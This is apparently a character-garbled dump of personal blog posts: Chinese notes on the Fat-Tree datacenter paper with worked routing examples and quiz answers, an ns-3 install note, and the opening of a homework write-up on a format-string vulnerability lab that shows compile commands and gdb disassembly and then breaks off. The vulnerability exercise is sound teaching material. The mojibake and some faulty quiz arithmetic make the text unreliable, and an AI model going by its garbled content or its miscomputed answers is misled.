66)\nåœ¨ç½‘ç»œä¸­ï¼Œæˆ‘ä»¬å°†æ‰€æœ‰çš„IPåœ°å€åˆ†é…åœ¨ç§æœ‰çš„10.0.0.0/8åœ°å€å—ä¸­ã€‚æˆ‘ä»¬æŒ‰ç†Ÿæ‚‰çš„å››ç‚¹å½¢å¼è¿›è¡Œåˆ†é…ï¼Œå…·ä½“å¦‚ä¸‹ï¼špodäº¤æ¢æœºçš„åœ°å€å½¢å¼ä¸º10.pod.switch.1ï¼Œå…¶ä¸­podè¡¨ç¤ºpodçš„ç¼–å·ï¼ˆèŒƒå›´åœ¨[0, k-1]ä¹‹é—´ï¼‰ï¼Œswitchè¡¨ç¤ºè¯¥podä¸­äº¤æ¢æœºçš„ä½ç½®ï¼ˆèŒƒå›´åœ¨[0, k-1]ä¹‹é—´ï¼Œä»å·¦åˆ°å³ï¼Œä»ä¸‹åˆ°ä¸Šï¼‰ã€‚æ ¸å¿ƒäº¤æ¢æœºçš„åœ°å€å½¢å¼ä¸º10.k.j.iï¼Œå…¶ä¸­jå’Œiè¡¨ç¤ºè¯¥äº¤æ¢æœºåœ¨(k/2) x (k/2)çš„æ ¸å¿ƒäº¤æ¢æœºç½‘æ ¼ä¸­çš„åæ ‡ï¼ˆèŒƒå›´åœ¨[1, k/2]ä¹‹é—´ï¼Œä»å·¦ä¸Šè§’å¼€å§‹ï¼‰ã€‚ä¸»æœºçš„åœ°å€ç”±å…¶æ‰€è¿æ¥çš„podäº¤æ¢æœºäº§ç”Ÿï¼›ä¸»æœºçš„åœ°å€å½¢å¼ä¸º10.pod.switch.IDï¼Œå…¶ä¸­IDæ˜¯è¯¥å­ç½‘ä¸­ä¸»æœºçš„ä½ç½®ï¼ˆèŒƒå›´åœ¨[2, k/2+1]ä¹‹é—´ï¼Œä»å·¦åˆ°å³ï¼‰ã€‚\näº¤æ¢æœºåœ°å€çš„åˆ†é… æ ¸å¿ƒäº¤æ¢æœºçš„åœ°å€ ä¸»æœºçš„åœ°å€ ç®—æ³• z åœ¨[k/2,k-1]çš„åŸå› ï¼špodé‡Œé¢çš„ä¸Šå±‚äº¤æ¢æœº\næœ€é‡Œé¢çš„ç¬¬ä¸€ä¸ªå¾ªç¯çš„æ„æ€æ˜¯ï¼šç»™podé‡Œé¢çš„ä¸Šå±‚äº¤æ¢æœºæŒ‰é¡ºåºæ·»åŠ å‰ç¼€\nç¬¬äºŒä¸ªaddprefixçš„æ„æ€æ˜¯å¢åŠ ä¸€ä¸ª0.0.0.0/0çš„é»˜è®¤å‰ç¼€\nç¬¬äºŒä¸ªå¾ªç¯çš„æ„æ€æ˜¯ç»™ä¸»æœºæ·»åŠ ç‰¹å®šå‰ç¼€\nâ€œThe reason for the modulo shift in the outgoing port is to avoid traffic from different lower-layer switches addressed to a host with the same host ID going to the same upper-layer switch.â€ (Al-Fares ç­‰, 2008, p. 68) ğŸ”¤å‡ºç«™ç«¯å£ä¹‹æ‰€ä»¥è¦è¿›è¡Œæ¨¡æ•°è½¬æ¢ï¼Œæ˜¯ä¸ºäº†é¿å…ä»ä¸åŒä¸‹å±‚äº¤æ¢æœºå‘é€åˆ°å…·æœ‰ç›¸åŒä¸»æœº ID çš„ä¸»æœºçš„æµé‡è¿›å…¥åŒä¸€ä¸Šå±‚äº¤æ¢æœºã€‚ğŸ”¤\nç”Ÿäº§æ ¸å¿ƒäº¤æ¢æœºè·¯ç”± (Al-Fares ç­‰, 2008, p. 68)\nå°±æ˜¯ä¸ºæ¯ä¸ªæ ¸å¿ƒäº¤æ¢æœºæŒ‰é¡ºåºåˆ†é…ä¸€ä¸ª10.x.0.0/16çš„è·¯ç”±\nä¾‹å­ ä»10.0.1.2åˆ°10.2.0.3\næºä¸»æœºï¼ˆ10.0.1.1ï¼‰çš„ç½‘å…³äº¤æ¢æœºåªä¼šåŒ¹é…å¸¦æœ‰ /0 ä¸€çº§å‰ç¼€çš„æ•°æ®åŒ…ï¼Œå› æ­¤ä¼šæ ¹æ®è¯¥å‰ç¼€çš„äºŒçº§è¡¨ä¸­çš„ä¸»æœº ID å­—èŠ‚è½¬å‘æ•°æ®åŒ…ã€‚åœ¨è¯¥è¡¨ä¸­ï¼Œæ•°æ®åŒ…åŒ¹é… 0.0.0.3/8 åç¼€ï¼ŒæŒ‡å‘ç«¯å£ 2 å’Œäº¤æ¢æœº 10.0.2.1ï¼ˆi=3ï¼Œz=1ï¼‰\nç«¯å£2:ï¼ˆ3-2+1)mod(4/2+4/2)=2 ä¸ºä»€ä¹ˆæŒ‡å‘10.0.2.1ï¼Ÿå› ä¸º10.0.1.1åˆ°ç«¯å£0å’Œç«¯å£1æŒ‡å‘å‘ä¸‹çš„ä¿©hostï¼Œç«¯å£2æŒ‡å‘10.0.2.1ï¼ˆä»ä¸‹åˆ°ä¸Šï¼Œä»å·¦åˆ°å³ï¼‰ â€œSwitch 10.0.2.1 also follows the same steps and forwards on port 3, connected to core switch 10.4.1.1â€ (Al-Fares ç­‰, 2008, p. 68) ğŸ”¤äº¤æ¢æœº 10.0.2.1 ä¹Ÿéµå¾ªç›¸åŒæ­¥éª¤ï¼Œåœ¨è¿æ¥åˆ°æ ¸å¿ƒäº¤æ¢æœº 10.4.1.2 çš„ç«¯å£ 3 ä¸Šè¿›è¡Œè½¬å‘ğŸ”¤\ni=3ï¼Œz=2ï¼Œï¼ˆ3-2+2ï¼‰modï¼ˆ2+2ï¼‰=3 å› ä¸ºç›®çš„åœ°å€åœ¨pod2ï¼Œæ ¸å¿ƒäº¤æ¢æœº10.4.1.2åŒ¹é…10.2.0.0/16ï¼Œç«¯å£2ï¼ŒæŒ‡å‘10.2.2.1\n10.2.2.1åŒ¹é…åˆ°10.2.0.0/24ï¼ŒæŒ‡å‘10.2.0.1\nğŸš© ç ”ç©¶ç»“è®º ğŸ“Œ æ„Ÿæƒ³ \u0026amp; ç–‘é—® What is the datacenter network? What is the desired property of the datacenter network? æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œå¯¹äºæ•°æ®ä¸­å¿ƒç½‘ç»œï¼Œè®ºæ–‡[1]æå‡ºäº†ä¸€ç§åŸºäºå¯æ‰©å±•æ€§å’Œé€šç”¨æ€§çš„æ¶æ„ã€‚æ•°æ®ä¸­å¿ƒç½‘ç»œæ—¨åœ¨æ”¯æŒå¤§è§„æ¨¡é›†ç¾¤ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶å…·æœ‰ä»¥ä¸‹æœŸæœ›ç‰¹æ€§ï¼š\n1. å¯æ‰©å±•æ€§ï¼šæ•°æ®ä¸­å¿ƒç½‘ç»œéœ€è¦èƒ½å¤Ÿæ”¯æŒæ•°ä»¥åƒè®¡ç”šè‡³æ•°ä»¥ç™¾ä¸‡è®¡çš„èŠ‚ç‚¹ï¼Œå¹¶æä¾›è‰¯å¥½çš„ååé‡å’Œæ€§èƒ½ã€‚è¿™æ˜¯å› ä¸ºæ•°æ®ä¸­å¿ƒé€šå¸¸ç”±å¤§é‡æœåŠ¡å™¨å’Œè®¡ç®—èµ„æºç»„æˆã€‚\n2. ä½å»¶è¿Ÿï¼šæ•°æ®ä¸­å¿ƒç½‘ç»œéœ€è¦å…·å¤‡ä½å»¶è¿Ÿçš„ç‰¹æ€§ï¼Œä»¥ç¡®ä¿å¿«é€Ÿå’Œé«˜æ•ˆçš„æ•°æ®ä¼ è¾“ã€‚è¿™å¯¹äºç½‘ç»œä¸­çš„å®æ—¶åº”ç”¨å’Œå¤§æ•°æ®å¤„ç†ç­‰ä»»åŠ¡è‡³å…³é‡è¦ã€‚\n3. é«˜å¸¦å®½ï¼šæ•°æ®ä¸­å¿ƒç½‘ç»œéœ€è¦å…·æœ‰é«˜å¸¦å®½ï¼Œä»¥å¤„ç†å¤§é‡æ•°æ®çš„ä¼ è¾“éœ€æ±‚ã€‚è¿™æ˜¯å› ä¸ºæ•°æ®ä¸­å¿ƒä¸­ç»å¸¸éœ€è¦åœ¨èŠ‚ç‚¹ä¹‹é—´è¿›è¡Œå¤§è§„æ¨¡çš„æ•°æ®ä¼ è¾“å’Œé€šä¿¡ã€‚\nÂ—What is the traditional three-tier topology for the datacenter, its limitations? ä¼ ç»Ÿçš„æ•°æ®ä¸­å¿ƒç½‘ç»œé‡‡ç”¨ä¸‰å±‚æ¶æ„ï¼ŒåŒ…æ‹¬æ ¸å¿ƒå±‚ã€èšåˆå±‚å’Œæ¥å…¥å±‚ã€‚æ ¸å¿ƒå±‚å¤„ç†æ•°æ®ä¸­å¿ƒå†…éƒ¨çš„é«˜çº§è·¯ç”±åŠŸèƒ½ï¼Œèšåˆå±‚ç”¨äºè¿æ¥æ ¸å¿ƒå±‚å’Œæ¥å…¥å±‚ï¼Œå¹¶æä¾›æµé‡èšåˆå’Œè´Ÿè½½å‡è¡¡ã€‚æ¥å…¥å±‚åˆ™è´Ÿè´£è¿æ¥ç»ˆç«¯è®¾å¤‡å’Œèšåˆå±‚ã€‚ç„¶è€Œï¼Œä¼ ç»Ÿçš„ä¸‰å±‚æ¶æ„åœ¨è§„æ¨¡æ‰©å¤§æ—¶ä¼šé¢ä¸´ä¸€äº›é™åˆ¶ï¼Œå¦‚å¸¦å®½ç“¶é¢ˆå’Œå¤æ‚çš„ç¼†çº¿å¸ƒå±€ï¼Œå¯¼è‡´æ•´ä½“æ€§èƒ½å’Œå¯æ‰©å±•æ€§å—é™ã€‚\nÂ—How Fat-tree differs from the traditional design? In Â—Topology\nFat-tree æ˜¯ä¸€ç§åˆ†å±‚çš„æ ‘å½¢ç»“æ„ï¼Œå®ƒé€šè¿‡å¢åŠ æ¥è¿‘æ ¹éƒ¨çš„èŠ‚ç‚¹çš„å¸¦å®½æ¥è§£å†³ç½‘ç»œç“¶é¢ˆé—®é¢˜ã€‚åœ¨è¿™ç§ç»“æ„ä¸­ï¼Œè¶Šé è¿‘æ ¹éƒ¨çš„èŠ‚ç‚¹ï¼ˆæ¯”å¦‚äº¤æ¢æœºï¼‰æ‹¥æœ‰æ›´é«˜çš„å¤„ç†èƒ½åŠ›å’Œæ›´å¤§çš„å¸¦å®½ã€‚è¿™ç§è®¾è®¡ä½¿å¾—ç½‘ç»œèƒ½å¤Ÿæ›´å¥½åœ°æ‰©å±•ï¼Œå¹¶æ”¯æŒæ›´å¤šçš„ç»ˆç«¯èŠ‚ç‚¹ã€‚\nÂ—Addressing\nIP åœ°å€èŒƒå›´ï¼š\næ‰€æœ‰çš„ IP åœ°å€éƒ½åˆ†é…åœ¨ç§æœ‰çš„ 10.0.0.0/8 åœ°å€å—å†…ã€‚ Pod äº¤æ¢æœºåœ°å€ï¼š\næ¯ä¸ª Pod äº¤æ¢æœºçš„ IP åœ°å€æ ¼å¼ä¸º 10.pod.switch.1ã€‚ å…¶ä¸­ pod æ˜¯ Pod ç¼–å·ï¼ŒèŒƒå›´æ˜¯ [0, k-1]ã€‚ switch æ˜¯è¯¥äº¤æ¢æœºåœ¨ Pod å†…çš„ä½ç½®ï¼ŒèŒƒå›´ä¹Ÿæ˜¯ [0, k-1]ï¼ŒæŒ‰ç…§ä»å·¦åˆ°å³ã€ä»ä¸‹åˆ°ä¸Šçš„é¡ºåºã€‚ æ ¸å¿ƒäº¤æ¢æœºåœ°å€ï¼š\næ ¸å¿ƒäº¤æ¢æœºçš„ IP åœ°å€æ ¼å¼ä¸º 10.k.j.iã€‚ j å’Œ i æ˜¯äº¤æ¢æœºåœ¨æ ¸å¿ƒäº¤æ¢æœºç½‘æ ¼ä¸­çš„åæ ‡ï¼ŒèŒƒå›´æ˜¯ [1, k/2]ï¼Œä»å·¦ä¸Šè§’å¼€å§‹ã€‚ ä¸»æœºåœ°å€ï¼š\nè¿æ¥åˆ° Pod äº¤æ¢æœºçš„ä¸»æœºçš„ IP åœ°å€æ ¼å¼ä¸º 10.pod.switch.IDã€‚ ID æ˜¯ä¸»æœºåœ¨å­ç½‘ä¸­çš„ä½ç½®ï¼ŒèŒƒå›´æ˜¯ [2, k/2+1]ï¼ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºã€‚ å­ç½‘ç®¡ç†ï¼š\næ¯ä¸ªä¸‹çº§äº¤æ¢æœºç®¡ç†ä¸€ä¸ªåŒ…å« k/2 å°ä¸»æœºçš„ /24 å­ç½‘ï¼ˆå½“ k å°äº 256 æ—¶ï¼‰ã€‚ Â—Routing algorithm æº $â„1h1$ åˆ°ç›®çš„åœ° $â„2h2$ çš„è·¯ç”±è·¯å¾„çš„ä¾‹å­ã€‚è¿™ä¸ªä¾‹å­ä¸­ï¼Œæºåœ°å€æ˜¯ 10.0.1.2ï¼Œç›®çš„åœ°åœ°å€æ˜¯ 10.2.0.3ã€‚ä»¥ä¸‹æ˜¯æ¯ä¸€è·³çš„è¯¦ç»†æè¿°ä»¥åŠå¦‚ä½•ç¡®å®šè¾“å‡ºç«¯å£ï¼š\nç¬¬ä¸€è·³ - ç½‘å…³äº¤æ¢æœº:\næºä¸»æœºçš„ç½‘å…³äº¤æ¢æœºï¼ˆ10.0.1.1ï¼‰é¦–å…ˆåŒ¹é…åˆ° /0 ç¬¬ä¸€çº§å‰ç¼€ï¼Œç„¶åæ ¹æ®è¯¥å‰ç¼€çš„äºŒçº§è¡¨ä¸­çš„ä¸»æœº ID å­—èŠ‚æ¥è½¬å‘æ•°æ®åŒ…ã€‚åœ¨è¿™ä¸ªè¡¨ä¸­ï¼Œæ•°æ®åŒ…åŒ¹é…åˆ° 0.0.0.3/8 åç¼€ï¼ŒæŒ‡å‘ç«¯å£ 2 å’Œäº¤æ¢æœº 10.0.2.1 (é¡µé¢ 6)ã€‚ ç¬¬äºŒè·³ - Pod äº¤æ¢æœº:\näº¤æ¢æœº 10.0.2.1 ä¹Ÿæ‰§è¡Œç›¸åŒçš„æ­¥éª¤ï¼Œå¹¶é€šè¿‡è¿æ¥åˆ°æ ¸å¿ƒäº¤æ¢æœº 10.4.1.1 çš„ç«¯å£ 3 è½¬å‘æ•°æ®åŒ…ã€‚ ç¬¬ä¸‰è·³ - æ ¸å¿ƒäº¤æ¢æœº:\næ ¸å¿ƒäº¤æ¢æœºåŒ¹é…æ•°æ®åŒ…åˆ°ä¸€ä¸ªç»ˆæ­¢çš„ 10.2.0.0/16 å‰ç¼€ï¼Œè¿™ä¸ªå‰ç¼€æŒ‡å‘ç›®çš„åœ° Pod 2ã€‚ å¦‚æœç›®çš„åœ°åœ°å€å˜æˆ 10.2.0.2ï¼Œè·¯ç”±è·¯å¾„å°†ä¼šæœ‰æ‰€ä¸åŒã€‚ä»¥ä¸‹æ˜¯åŸºäºæ–‡æ¡£ä¸­çš„ä¸¤çº§è·¯ç”±è¡¨å’Œç½‘ç»œæ‹“æ‰‘çš„è¯¦ç»†è§£é‡Šï¼š\nç¬¬ä¸€è·³ - ç½‘å…³äº¤æ¢æœº:\næºä¸»æœºçš„ç½‘å…³äº¤æ¢æœºï¼ˆå‡è®¾ä¸º 10.0.1.1ï¼‰é¦–å…ˆåŒ¹é…åˆ° /0 ç¬¬ä¸€çº§å‰ç¼€ã€‚ç„¶åï¼Œå®ƒä¼šæ ¹æ®è¯¥å‰ç¼€çš„äºŒçº§è¡¨ä¸­çš„ä¸»æœº ID å­—èŠ‚æ¥è½¬å‘æ•°æ®åŒ…ã€‚åœ¨è¿™ä¸ªè¡¨ä¸­ï¼Œæ•°æ®åŒ…åŒ¹é…åˆ°çš„åç¼€å°†ä¼šæ˜¯ 0.0.0.2/8ï¼Œè¿™å°†å†³å®šæ•°æ®åŒ…åº”è¯¥è½¬å‘åˆ°çš„ç«¯å£å’Œä¸‹ä¸€ä¸ªäº¤æ¢æœºã€‚ ç¬¬äºŒè·³ - Pod äº¤æ¢æœº:\nç¬¬äºŒä¸ªäº¤æ¢æœºï¼ˆä¾‹å¦‚ 10.0.2.1ï¼‰ä¹Ÿä¼šæ‰§è¡Œç±»ä¼¼çš„æ­¥éª¤ï¼Œæ ¹æ®å…¶è·¯ç”±è¡¨ä¸­çš„åŒ¹é…é¡¹æ¥å†³å®šå°†æ•°æ®åŒ…è½¬å‘åˆ°å“ªä¸ªç«¯å£ï¼Œä»¥åŠä¸‹ä¸€ä¸ªç›®æ ‡æ ¸å¿ƒäº¤æ¢æœºã€‚ ç¬¬ä¸‰è·³ - æ ¸å¿ƒäº¤æ¢æœº:\nåˆ°è¾¾æ ¸å¿ƒäº¤æ¢æœºï¼ˆä¾‹å¦‚ 10.4.1.1ï¼‰åï¼Œå®ƒä¼šåŒ¹é…æ•°æ®åŒ…åˆ°ä¸€ä¸ªç»ˆæ­¢çš„ 10.2.0.0/16 å‰ç¼€ã€‚è¿™ä¸ªå‰ç¼€æŒ‡å‘ç›®çš„åœ° Pod 2ã€‚æ ¸å¿ƒäº¤æ¢æœºå°†æ ¹æ®å…¶è·¯ç”±è¡¨å†³å®šå°†æ•°æ®åŒ…è½¬å‘åˆ°å“ªä¸ª Pod äº¤æ¢æœºã€‚ æœ€åä¸€è·³ - åˆ°è¾¾ç›®çš„åœ°:\nåœ¨ Pod 2 å†…ï¼Œç›¸åº”çš„äº¤æ¢æœºå°†æ ¹æ®å…¶è·¯ç”±è¡¨æ¥å†³å®šå¦‚ä½•å°†æ•°æ®åŒ…æœ€ç»ˆè½¬å‘åˆ°ç›®çš„åœ°åœ°å€ 10.2.0.2 çš„ä¸»æœºã€‚ é—®é¢˜ å‡è®¾ Fattree ç”¨10.0.0.0/8çš„åœ°å€ç©ºé—´è¿›è¡Œç¼–å€ï¼Œä¸”ä¸è€ƒè™‘å•ä¸ªäº¤æ¢æœºå¤§å°çš„ç‰©ç†é™åˆ¶ã€‚\n1. è¯¥åœ°å€ç©ºé—´æ‰€èƒ½æ”¯æŒçš„æœ€å¤§ Fattree æœ‰å¤šå°‘ä¸ªpodï¼Œå³K=\né¦–å…ˆï¼Œ10.0.0.0/8çš„åœ°å€ç©ºé—´æœ‰\n$$2^{24}$$\nä¸ªIPåœ°å€ï¼Œå…¶ä¸­ä¸€ä¸ªåœ°å€ç”¨äºç½‘ç»œæ ‡è¯†ï¼Œä¸€ä¸ªåœ°å€ç”¨äºå¹¿æ’­ï¼Œå‰©ä¸‹çš„åœ°å€ç”¨äºä¸»æœºã€‚\n$$\\frac{k^3}{4} \\leq 2^{24}-2$$\nk=406\n2.ä»¥ä¸‹å“ªä¸ªæ•°å­—æ˜¯ä¸€ä¸ªå®Œæ•´çš„Fattree å¯èƒ½æ”¯æŒçš„ä¸»æœºæ•°ï¼ˆï¼‰\nA. 4194304\nB. 2097152\nC.3906250\nD. 2916000\nå¯¹äºAé€‰é¡¹ï¼ˆ4194304ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦è§£æ–¹ç¨‹ $\\frac{k^3}{4}=4194304$ã€‚ å¯¹äºBé€‰é¡¹ï¼ˆ2097152ï¼‰ï¼Œæ–¹ç¨‹ä¸º $\\frac{k^3}{4}=2097152$ã€‚ å¯¹äºCé€‰é¡¹ï¼ˆ3906250ï¼‰ï¼Œæ–¹ç¨‹ä¸º $\\frac{k^3}{4}=3906250$ã€‚ å¯¹äºDé€‰é¡¹ï¼ˆ2916000ï¼‰ï¼Œæ–¹ç¨‹ä¸º $\\frac{k^3}{4}=2916000$ã€‚ æˆ‘ä»¬å¯ä»¥è®¡ç®—æ¯ä¸ªæ–¹ç¨‹æ¥æ‰¾å‡ºæ­£ç¡®çš„ç­”æ¡ˆã€‚\næ ¹æ®è®¡ç®—ç»“æœï¼š\nå¯¹äºé€‰é¡¹Aï¼ˆ4194304ï¼‰ï¼Œè®¡ç®—å¾—åˆ°çš„kå€¼çº¦ä¸º256ï¼Œæ˜¯ä¸€ä¸ªåˆç†çš„å¶æ•°ã€‚ å¯¹äºé€‰é¡¹Bï¼ˆ2097152ï¼‰ï¼Œè®¡ç®—å¾—åˆ°çš„kå€¼çº¦ä¸º203.19ï¼Œä¸æ˜¯å¶æ•°ã€‚ å¯¹äºé€‰é¡¹Cï¼ˆ3906250ï¼‰ï¼Œè®¡ç®—å¾—åˆ°çš„kå€¼çº¦ä¸º250ï¼Œæ˜¯ä¸€ä¸ªåˆç†çš„å¶æ•°ã€‚ å¯¹äºé€‰é¡¹Dï¼ˆ2916000ï¼‰ï¼Œè®¡ç®—å¾—åˆ°çš„kå€¼çº¦ä¸º226.79ï¼Œä¸æ˜¯å¶æ•°ã€‚ ç”±äºkå¿…é¡»æ˜¯å¶æ•°ï¼Œå› æ­¤åªæœ‰é€‰é¡¹Aå’ŒCçš„kå€¼ç¬¦åˆæ¡ä»¶ã€‚ä½†åœ¨Fat-treeæ‹“æ‰‘ä¸­ï¼Œké€šå¸¸æ˜¯2çš„å¹‚æ¬¡æ–¹ï¼Œæ‰€ä»¥æœ€ç¬¦åˆæ¡ä»¶çš„ç­”æ¡ˆæ˜¯é€‰é¡¹Aï¼ˆ4194304ï¼‰ï¼Œå…¶å¯¹åº”çš„kå€¼ä¸º256ã€‚\n3. Fattree ç”¨çš„æ˜¯äº¤æ¢æœºè¿æ¥ï¼Œç»™æ¯ä¸ªäº¤æ¢æœºåˆ†é… IPåœ°å€çš„ç›®çš„æ˜¯\nâ€œwe introduce the concept of two-level route lookups to assist with multi-path routing across the fat-tree.â€ (Al-Fares ç­‰, 2008, p. 66) ğŸ”¤æˆ‘ä»¬å¼•å…¥äº†ä¸¤çº§è·¯ç”±æŸ¥æ‰¾çš„æ¦‚å¿µï¼Œä»¥å¸®åŠ©åœ¨èƒ–æ ‘ä¸Šè¿›è¡Œå¤šè·¯å¾„è·¯ç”±é€‰æ‹©ã€‚ğŸ”¤\nâ€œEven though this is relatively wasteful use of the available address space, it simplifies building the routing tables, as seen below.â€ (Al-Fares ç­‰, 2008, p. 66) ğŸ”¤å°½ç®¡è¿™ç›¸å¯¹æµªè´¹äº†å¯ç”¨åœ°å€ç©ºé—´ï¼Œä½†å´ç®€åŒ–äº†è·¯ç”±è¡¨çš„æ„å»ºï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ğŸ”¤\nFattreeä½¿ç”¨äº¤æ¢æœºè¿æ¥ï¼Œå¹¶ç»™æ¯ä¸ªäº¤æ¢æœºåˆ†é…IPåœ°å€çš„ç›®çš„æ˜¯ä¸ºäº†å®ç°æ•°æ®ä¸­å¿ƒçš„é€šä¿¡å’Œè·¯ç”±åŠŸèƒ½ã€‚é€šè¿‡ç»™äº¤æ¢æœºåˆ†é…IPåœ°å€ï¼Œå¯ä»¥åœ¨ç½‘ç»œä¸­å¯¹ä¸åŒçš„ä¸»æœºè¿›è¡Œå®šä½å’Œè¯†åˆ«ï¼Œå®ç°æ•°æ®åŒ…çš„è½¬å‘å’Œæ•°æ®ä¸­å¿ƒç½‘ç»œçš„è·¯ç”±æ§åˆ¶ã€‚è¿™æ ·å¯ä»¥ä¿è¯åœ¨æ•°æ®ä¸­å¿ƒç½‘ç»œä¸­çš„æ¯ä¸ªäº¤æ¢æœºéƒ½èƒ½å¤Ÿå‡†ç¡®åœ°è¯†åˆ«å’Œè½¬å‘æ•°æ®åŒ…ã€‚æ­¤å¤–ï¼Œé€šè¿‡å¯¹ä¸åŒäº¤æ¢æœºåˆ†é…ä¸åŒçš„IPåœ°å€ï¼Œè¿˜å¯ä»¥æ„å»ºç½‘ç»œæ‹“æ‰‘å’Œè·¯ç”±è¡¨ï¼Œå®ç°æ•°æ®ä¸­å¿ƒç½‘ç»œçš„é«˜æ•ˆé€šä¿¡å’Œè´Ÿè½½å‡è¡¡ã€‚\nğŸ”¬ ç†è®ºæ¨å¯¼ å‚è€ƒ https://blog.csdn.net/baidu_20163013/article/details/110004560\nhttps://blog.csdn.net/u012925450/article/details/108493968\nhttps://blog.csdn.net/weixin_44639164/article/details/126950178?\n","date":"2023-12-19T15:45:19+08:00","permalink":"https://anonymity-0.github.io/posts/fat-tree/","title":"Fat Tree"},{"content":"ä»‹ç» ns3æ˜¯ç”¨æ¥è¿›è¡Œç½‘ç»œä»¿çœŸçš„ä¸€ä¸ªå¹³å°\nå­¦ä¹ èµ„æº ç•¥\nå®‰è£… æºç å®‰è£… è¯¦æƒ…å¯å‚è€ƒns-3 Installation Guide â€” Installation guide\nä¸‹è½½æºç  [Releases | ns-3](https://www.nsnam.org/releases/ è¿›å…¥ç½‘ç«™é€‰æ‹©ç‰ˆæœ¬ä¸‹è½½ ç¼–è¯‘æºç  è§£å‹è¿›å…¥æ–‡ä»¶å¤¹ cd /Users/x x x/Downloads/ns-allinone-3.40 ç¼–è¯‘æ–‡ä»¶ ./build.py --enable-examples --enable-tests æ³¨ï¼šè®°å¾—æå‰å®‰è£…å¥½cmake brew install cmake å®‰è£…å®Œæˆä»¥åcd ns-3.40å¯ä»¥é€šè¿‡lsæŸ¥çœ‹æ–‡ä»¶å†…å®¹\nåœ¨ns-3.36ç‰ˆæœ¬ä¹‹åï¼Œns-3çš„æ„å»ºç³»ç»Ÿä»wafæ›´æ”¹ä¸ºCMakeï¼Œå¹¶å¼•å…¥äº†ä¸€ä¸ªåä¸ºns3çš„Pythonè„šæœ¬æ¥æ›¿ä»£waf\nè¿è¡Œç¬¬ä¸€ä¸ªæ¨¡æ‹Ÿä»¿çœŸè„šæœ¬ é€šè¿‡ ./ns3 run hello-simulator è¿è¡Œ\næµ‹è¯•çš„å®‰è£… 1 agq@AGdeMacBook-Air ns-3.40 % ./test.py ","date":"2023-12-18T15:38:41+08:00","permalink":"https://anonymity-0.github.io/posts/ns-3%E5%88%9D%E4%B8%8A%E6%89%8B/","title":"NS 3åˆä¸Šæ‰‹"},{"content":"é¢˜ç›®ï¼šåœ¨32ä½çš„ubuntu16.04è¿è¡Œç¯å¢ƒä¸‹ï¼Œå¯¹æ ¼å¼åŒ–æ¼æ´ç¨‹åºvul_formatstr2.cï¼Œå‚ç…§ 12.2.4çš„æ–¹æ³•ï¼Œè¯´æ˜å¦‚ä½•ä¿®æ”¹ç¨‹åºï¼Œå°†å˜é‡Bçš„å€¼æ”¹æˆ0x5678CDEFã€‚\nåœ¨Ubuntu 64ä½ç³»ç»Ÿä¸Šï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…gccå¤šæ¶æ„ç¼–è¯‘å™¨å’Œ32ä½åº“ï¼š\nsudo apt-get install gcc-multilib libc6-dev-i386\nåœ¨ç¼–è¯‘Cç¨‹åºæ—¶ï¼Œä½¿ç”¨-m32é€‰é¡¹æ¥ç”Ÿæˆ32ä½çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š gcc -m32 -o v2 vul_formatstr2.c\nazureuser@MyServer:~/hw$ gdb v2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 0x0000122d \u0026lt;+0\u0026gt;: endbr32 0x00001231 \u0026lt;+4\u0026gt;: push %ebp 0x00001232 \u0026lt;+5\u0026gt;: mov %esp,%ebp 0x00001234 \u0026lt;+7\u0026gt;: push %ebx 0x00001235 \u0026lt;+8\u0026gt;: sub $0x414,%esp 0x0000123b \u0026lt;+14\u0026gt;: call 0x1130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x00001240 \u0026lt;+19\u0026gt;: add $0x2d8c,%ebx 0x00001246 \u0026lt;+25\u0026gt;: mov %gs:0x14,%eax 0x0000124c \u0026lt;+31\u0026gt;: mov %eax,-0xc(%ebp) 0x0000124f \u0026lt;+34\u0026gt;: xor %eax,%eax 0x00001251 \u0026lt;+36\u0026gt;: movl $0x3435,-0x418(%ebp) 0x0000125b \u0026lt;+46\u0026gt;: movl $0x5657,-0x414(%ebp) 0x00001265 \u0026lt;+56\u0026gt;: movl $0x7879,-0x410(%ebp) 0x0000126f \u0026lt;+66\u0026gt;: lea -0x410(%ebp),%eax 0x00001275 \u0026lt;+72\u0026gt;: push %eax 0x00001276 \u0026lt;+73\u0026gt;: lea -0x414(%ebp),%eax 0x0000127c \u0026lt;+79\u0026gt;: push %eax 0x0000127d \u0026lt;+80\u0026gt;: lea -0x418(%ebp),%eax 0x00001283 \u0026lt;+86\u0026gt;: push %eax 0x00001284 \u0026lt;+87\u0026gt;: lea -0x1fc4(%ebx),%eax 0x0000128a \u0026lt;+93\u0026gt;: push %eax 0x0000128b \u0026lt;+94\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x00001290 \u0026lt;+99\u0026gt;: add $0x10,%esp 0x00001293 \u0026lt;+102\u0026gt;: mov -0x410(%ebp),%ecx 0x00001299 \u0026lt;+108\u0026gt;: mov -0x414(%ebp),%edx 0x0000129f \u0026lt;+114\u0026gt;: mov -0x418(%ebp),%eax 0x000012a5 \u0026lt;+120\u0026gt;: push %ecx 0x000012a6 \u0026lt;+121\u0026gt;: push %edx 0x000012a7 \u0026lt;+122\u0026gt;: push %eax 0x000012a8 \u0026lt;+123\u0026gt;: lea -0x1fab(%ebx),%eax 0x000012ae \u0026lt;+129\u0026gt;: push %eax 0x000012af \u0026lt;+130\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000012b4 \u0026lt;+135\u0026gt;: add $0x10,%esp 0x000012b7 \u0026lt;+138\u0026gt;: sub $0xc,%esp 0x000012ba \u0026lt;+141\u0026gt;: lea -0x1f94(%ebx),%eax 0x000012c0 \u0026lt;+147\u0026gt;: push %eax 0x000012c1 \u0026lt;+148\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 0x000012c6 \u0026lt;+153\u0026gt;: add $0x10,%esp 0x000012c9 \u0026lt;+156\u0026gt;: sub 